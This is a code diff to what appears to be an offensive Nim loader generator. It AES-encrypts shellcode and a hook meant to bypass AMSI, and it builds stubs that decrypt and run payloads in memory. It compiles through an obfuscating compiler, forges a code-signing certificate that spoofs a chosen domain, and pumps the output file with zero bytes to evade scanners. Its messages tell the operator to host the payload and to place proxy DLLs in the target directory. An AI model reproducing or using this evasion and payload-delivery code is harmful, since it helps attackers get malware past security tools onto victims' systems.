@@ -635,7 +635,7 @@ else:
 
 #if (AMSICreateSectionHook):
 #    echo "Not fully working yet, sorry!"
-    quit(0)
+    #quit(0)
 
 #Read file and if PE convert to shellcode before
 if (peinject):
@@ -726,6 +726,39 @@ echo "Writing encrypted blob to disk: "
 
 var content: string = cast[string](enctext)
 writeFile(shellcodeFile[0], content)
+
+if(AMSICreateSectionHook):
+    echo "\r\n[*] Encrypting NtCreateSection-Hook Shellcode: \r\n"
+    var
+        data2: seq[byte] = toByteSeq(readFile("hook.bin"))
+
+        ectx2: ECB[aes256]
+    
+    # AES256 block size is 128 bits or 16 bytes, so we need to pad plaintext with
+    # 0 bytes. Not the best crypto, but to be honest - who tries to break AES256??
+    if ((len(data2) mod aes256.sizeBlock) != 0):
+        echo "[*] Payload length not a multiple of the BlockSize: ", aes256.sizeBlock
+        echo "[*] Length: " & $len(data2)
+        echo "[*] Padding payload..."
+        data2 = data2 & newSeq[byte](aes256.sizeBlock - (len(data2) mod aes256.sizeBlock))
+        echo "[*] New Length: " & $len(data2)
+        
+    var
+        plaintext2 = newSeq[byte](len(data2))
+        enctext2 = newSeq[byte](len(data2))
+
+    copyMem(addr plaintext2[0], addr data2[0], len(data2))
+    echo "[*] Plaintext length: " & $len(plaintext2)
+    echo "[*] Enctext length: " & $len(enctext2)
+
+    ectx2.init(key)
+    ectx2.encrypt(plaintext2, enctext2)
+    ectx2.clear()
+
+    echo "Writing encrypted Hook-blob to disk: "
+
+    var content2: string = cast[string](enctext2)
+    writeFile("enchook.blob", content2)
 
 proc getRandStub (): string =
   var randName: string = rndStr(rand(10..25))
@@ -1243,11 +1276,37 @@ let Cryptstub3 = fmt"""
 
     proc decryptLate(): void =
         when defined(verbose):
-            echo obf("[!] Decrypting Shellcode for execution in memory")
+            when defined(csharp):
+                echo obf("[!] Decrypting C# Assembly for execution...")
+            else:
+                echo obf("[!] Decrypting Payload for execution in memory...")
         dctx.init(ptrKey)
         discard calcHard()
         dctx.decrypt(ptrEncText, ptrDecText, dataLen)
         dctx.clear()
+
+"""
+
+let AmsiNtCreateSectionDecryptStub = fmt"""
+
+var dctx2: ECB[aes256]
+var key2: array[aes256.sizeKey, byte]
+discard calcHard()
+var envkey2: string = obf("{envkey}")
+
+var expandedkey2 = toByteSeq(envkey2)
+discard calcHard()
+if ((len(expandedkey2) mod aes256.sizeBlock) != 0):
+    when defined(verbose):
+        echo "[*] Key length not a multiple of KeySize: ", aes256.sizeBlock
+        echo "[*] Length: " & $len(expandedkey2)
+        echo "[*] Padding Key with null bytes"
+    expandedkey2 = expandedkey2 & newSeq[byte](aes256.sizeBlock - (len(expandedkey2) mod aes256.sizeBlock))
+    when defined(verbose):
+        echo "[*] New Length: " & $len(expandedkey2)
+
+moveMemory(addr key2[0], addr expandedkey2[0], len(expandedkey2))
+discard calcHard()
 
 """
 
@@ -1746,6 +1805,7 @@ if(hellsgate):
         stub.add(HellsgateNtCreateThreadExDelegate)
 
 if (AMSICreateSectionHook):
+    stub.add(AmsiNtCreateSectionDecryptStub)
     stub.add(AMSINtCreateSectionHookStubFirst)
 
 stub.add(MainStub)
@@ -1986,6 +2046,7 @@ if(dll_out or cpl):
 
 if (debugMode):
     stub = stub.replace("import strenc", "")
+    stub = stub.replace("when not defined(proxy):", "")
 
 writeFile("Loader.nim", stub)
 echo "Written Loader.nim -> \n\n"
@@ -2202,19 +2263,34 @@ when system.hostOS == "windows":
         var exist: bool = fileExists(".\\denim\\denim.exe")
         # cause some compile problems
         basicCompileFlags = basicCompileFlags.replace("--passc=-flto --passl=-flto ", "")
+        basicCompileFlags = basicCompileFlags.replace("-d:danger -d:strip ", "")
         if (exist):
             # An additional whitespace at the end causes an compiler error here, so we'll remove it
             basicCompileFlags = basicCompileFlags.replace(" \r\n", "")
             stub = stub.replace("import strenc", "")
+            stub = stub.replace("when not defined(proxy):", "")
             writeFile("Loader.nim", stub)
+
+            echo "Denim compile argument: \r\n"
+
+            echo fmt".\\denim\\denim.exe compile Loader.nim -A ""{basicCompileFlags}""\r\n"
             discard os.execShellCmd(fmt".\\denim\\denim.exe compile Loader.nim -A ""{basicCompileFlags}""")
-            let msg = fmt"[!] Encrypted file saved to {outfile}"
-            echo "\n" & msg
-            if(replace):
-                var randstring: string = rndStr(2)
-                echo fmt"[!] ---> replacing nim with {randstring} "
-                discard exec_cmd_ex(fmt"nimgrep nim --replace {randstring} {outfile}")
-            quit()
+            
+            var exists: bool = true
+            try:
+                var fileCheck = readFile("Loader.exe")
+            except:
+                exists = false
+            if(exists):
+                let msg = fmt"[!] Encrypted file saved as 'Loader.exe' (--output FilaName is ignored by denim)"
+                echo "\n" & msg
+                if(replace):
+                    var randstring: string = rndStr(2)
+                    echo fmt"[!] ---> replacing nim with {randstring} "
+                    discard exec_cmd_ex(fmt"nimgrep nim --replace {randstring} {outfile}")
+            else:
+                echo "\r\nCompilation failed! Check the error message\r\n"
+                quit()
 elif system.hostOS == "linux":
     if (denim):
         echo "No Denim support for Linux systems, sorry!"
@@ -2255,63 +2331,65 @@ if(dll_out):
         else:
             discard os.execShellCmd(fmt"{packerPath}\NetClone\PyClone.py --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}")
 
-let msg = fmt"[!] Loader saved to {outfile}"
-echo "\n" & msg
-if(retrieveFromFile):
-    echo fmt"[!] Encrypted Payload saved to {shellcodeFile[0]}"
-if (callobfs):
-    when system.hostOS == "windows":
-        var outfileonlyname = outfile.replace(packerPath, "")
-        echo "\r\nObfuscating some Windows API's via CallObfuscator:\r\n"
-        echo exec_cmd_ex(fmt"cobf\cobf_x64.exe {outfile} cobf\{outfileonlyname} cobf\config.ini")
-        echo "\r\n"
-        echo fmt"Obfuscated binary saved to: cobf\{outfileonlyname}"
-        outfile = packerPath & "\\" & fmt"cobf\{outfileonlyname}"
-    else:
-        echo "Only usable from a Windows OS, sorry!"
 
-if (sign):
-    echo "[*] Using Limelighter to generate a fake code signing certificate for the binary"
-    echo fmt"[*] The domain to spoof the certificate from will be {signdomain}"
-    var extension: string = ".exe"
-    if (cpl):
-        extension = ".cpl"
-    elif(dll_out):
-        extension = ".dll"
-    if system.hostOS == "linux":
-        discard os.execShellCmd(fmt"{packerPath}/LimeLighter/Limelighter -Domain {signdomain} -I {outfile} -O {outfile}.Signed{extension}")
-    when system.hostOS == "windows":
-        discard os.execShellCmd(fmt"{packerPath}\LimeLighter\Limelighter.exe -Domain {signdomain} -I {outfile} -O {outfile}.Signed{extension}")
-    if (dll_out):
-        outfile.add(fmt".Signed{extension}")
-    else:
-        outfile.add(fmt".Signed{extension}")
+var exists: bool = true
+try:
+    var fileCheck = readFile(fmt"{outfile}")
+except:
+    exists = false
 
-if (pump):
-    for m in pumpargs:
-        if(m == "size"):
+if(exists):
+    let msg = fmt"[!] Loader saved to {outfile}"
+    echo "\n" & msg
+    if(retrieveFromFile):
+        echo fmt"[!] Encrypted Payload saved to {shellcodeFile[0]}"
+    if (callobfs):
+        when system.hostOS == "windows":
+            var outfileonlyname = outfile.replace(packerPath, "")
+            echo "\r\nObfuscating some Windows API's via CallObfuscator:\r\n"
+            echo exec_cmd_ex(fmt"cobf\cobf_x64.exe {outfile} cobf\{outfileonlyname} cobf\config.ini")
+            echo "\r\n"
+            echo fmt"Obfuscated binary saved to: cobf\{outfileonlyname}"
+            outfile = packerPath & "\\" & fmt"cobf\{outfileonlyname}"
+        else:
+            echo "Only usable from a Windows OS, sorry!"
 
-            var pumpexecutable = readFile(outfile)
+    if (sign):
+        echo "[*] Using Limelighter to generate a fake code signing certificate for the binary"
+        echo fmt"[*] The domain to spoof the certificate from will be {signdomain}"
+        var extension: string = ".exe"
+        if (cpl):
+            extension = ".cpl"
+        elif(dll_out):
+            extension = ".dll"
+        if system.hostOS == "linux":
+            discard os.execShellCmd(fmt"{packerPath}/LimeLighter/Limelighter -Domain {signdomain} -I {outfile} -O {outfile}.Signed{extension}")
+        when system.hostOS == "windows":
+            discard os.execShellCmd(fmt"{packerPath}\LimeLighter\Limelighter.exe -Domain {signdomain} -I {outfile} -O {outfile}.Signed{extension}")
+        if (dll_out):
+            outfile.add(fmt".Signed{extension}")
+        else:
+            outfile.add(fmt".Signed{extension}")
 
-            var pumpzero: seq[byte] = @[byte 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00]
+    if (pump):
+        for m in pumpargs:
+            if(m == "size"):
+                var pumpexecutable = readFile(outfile)
+                var pumpzero: seq[byte] = @[byte 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00]
+                proc pumpHard(number: int): seq[byte] =
+                    var pump: seq[byte] = pumpzero
+                    for i in 0 ..< number:
+                        pump.add(pumpzero)
+                    return pump
+                var pumped: seq[byte] = pumpHard(rand(952182..1161782)) 
+                var pumpsequence: seq[byte] = toByteSeq(pumpexecutable)
+                pumpsequence.add(pumped)
+                writeFile(fmt"{outfile}",pumpsequence)
 
-            proc pumpHard(number: int): seq[byte] =
-              var pump: seq[byte] = pumpzero
-              for i in 0 ..< number:
-                pump.add(pumpzero)
-              return pump
+    if (retrieveFromURL):
+        echo fmt"[!] Make sure to host the {shellcodeFile[0]} file on your webserver with the correct filename to have a working payload ;-)"
 
-            var pumped: seq[byte] = pumpHard(rand(952182..1161782)) 
-
-            var pumpsequence: seq[byte] = toByteSeq(pumpexecutable)
-
-            pumpsequence.add(pumped)
-
-
-            writeFile(fmt"{outfile}",pumpsequence)
-
-if (retrieveFromURL):
-    echo fmt"[!] Make sure to host the {shellcodeFile[0]} file on your webserver with the correct filename to have a working payload ;-)"
-
-if (dllProxy):
-    echo fmt"[!] Original DLL saved as {randValue}.dll - you need to copy both files into the target directory to have a working payload ;-)"
+    if (dllProxy):
+        echo fmt"[!] Original DLL saved as {randValue}.dll - you need to copy both files into the target directory to have a working payload ;-)"
+else:
+    echo "\r\nCompilation failed!! Check the error message.\r\n"
